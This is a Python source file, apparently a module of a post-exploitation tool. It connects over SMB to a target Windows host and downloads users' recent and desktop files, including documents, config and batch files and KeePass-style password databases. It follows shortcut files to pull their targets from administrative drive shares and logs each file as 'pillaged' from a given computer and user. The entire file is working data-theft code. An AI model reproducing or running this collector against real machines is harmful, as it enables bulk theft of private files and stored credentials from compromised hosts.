import ntpath
import LnkParse3,os
from lib.toolbox import bcolors
from lib.fileops import MyFileOps

class recent_files():
    def __init__(self,smb,myregops,myfileops,logger,options,db,users):
        self.myregops = myregops
        self.myfileops = myfileops
        self.logging = logger
        self.options = options
        self.db = db
        self.users = users
        self.smb = smb


    def run(self):
        self.get_files()
        #self.process_files()

    def get_files(self):
        self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering Recent Files and Desktop Files {bcolors.ENDC}")
        blacklist = ['.', '..']

        user_directories = [("Users\\{username}\\Recent", ('*.xls','*.pdf','*.doc*','*.txt','*.lnk','*.kbdx','*.xml','*.config','*.bat')),
                            ("Users\\{username}\\Desktop", ('*.xls','*.pdf','*.doc*','*.txt','*.lnk','*.kbdx','*.xml','*.config','*.bat'))]
        machine_directories = [("Windows\\System32\\Drivers\\etc", ('hosts','hosts'))]

        for user in self.users:
            self.logging.debug(
                f"[{self.options.target_ip}] Looking for {user.username} ")
            if user.username == 'MACHINE$':
                directories_to_use = machine_directories
            else:
                directories_to_use = user_directories

            for info in directories_to_use:
                my_dir, my_mask = info
                tmp_pwd = my_dir.format(username=user.username)
                self.logging.debug(f"[{self.options.target_ip}] Looking for {user.username} files in {tmp_pwd} with mask {my_mask}")
                for mask in my_mask:
                    my_directory = self.myfileops.do_ls(tmp_pwd, mask, display=False)
                    for infos in my_directory:
                        longname, is_directory = infos
                        self.logging.debug("ls returned file %s" % longname)
                        if longname not in blacklist and not is_directory:
                            try:
                                # Downloading file
                                localfile = self.myfileops.get_file(ntpath.join(tmp_pwd, longname), allow_access_error=True)
                                self.process_file(localfile,user.username)
                            except Exception as ex:
                                self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception in DownloadFile {localfile}{bcolors.ENDC}")
                                self.logging.debug(ex)

    def process_file(self,localfile,from_user):
        if os.path.splitext(localfile)[-1] == '.lnk':
            self.logging.debug(
                f"[{self.options.target_ip}] {bcolors.WARNING} {localfile} is a lnk file {bcolors.ENDC}")
            new_localfile=self.process_lnk(localfile)
            if new_localfile != '':
                if os.path.splitext(new_localfile)[-1] != '.lnk':
                    self.process_file(new_localfile,from_user)
                    return 1
            return -1
        #TODO
        #Analyse du contenu =>
        #energistrement des infos dans la DB
        self.db.add_file(file_path=os.path.abspath(localfile), filename=os.path.split(localfile)[1],extension=os.path.splitext(localfile)[-1].replace('.',''),pillaged_from_computer_ip=self.options.target_ip,pillaged_from_username=from_user)


    def process_lnk(self,localfile):
        try:
            with open(localfile, 'rb') as indata:
                lnk = LnkParse3.lnk_file(indata)
                #lnk.print_json()
                #self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}LNK file {localfile} gives {lnk.get_json()['link_info']['local_base_path']} {bcolors.ENDC}")

            #check drive letter
            if 'local_base_path' in lnk.get_json()['link_info']:
                drive_letter=lnk.get_json()['link_info']['local_base_path'][0]+'$'
                new_fileops=MyFileOps(self.smb,self.logging,self.options)
                new_fileops.do_use(drive_letter)
                tmp_pwd = lnk.get_json()['link_info']['local_base_path'][len(f"{drive_letter}:\\")-1:]
                self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}tmp_pwd is {drive_letter} : {tmp_pwd} for {localfile}{bcolors.ENDC}")
                if os.path.splitext(tmp_pwd)[-1].replace('.','') != 'exe':#in ['xls','pdf','doc','docx','txt','bat','kbdx','xml','config']:
                    new_localfile = new_fileops.get_file(tmp_pwd, allow_access_error=True)
                    self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}downloaded {new_localfile} for {localfile}{bcolors.ENDC}")
                    return new_localfile
            return ''
        except Exception as ex:
            self.logging.debug(
                f"[{self.options.target_ip}] {bcolors.WARNING}Exception in ProcessF Lnk for {localfile}{bcolors.ENDC}")
            self.logging.debug(ex)

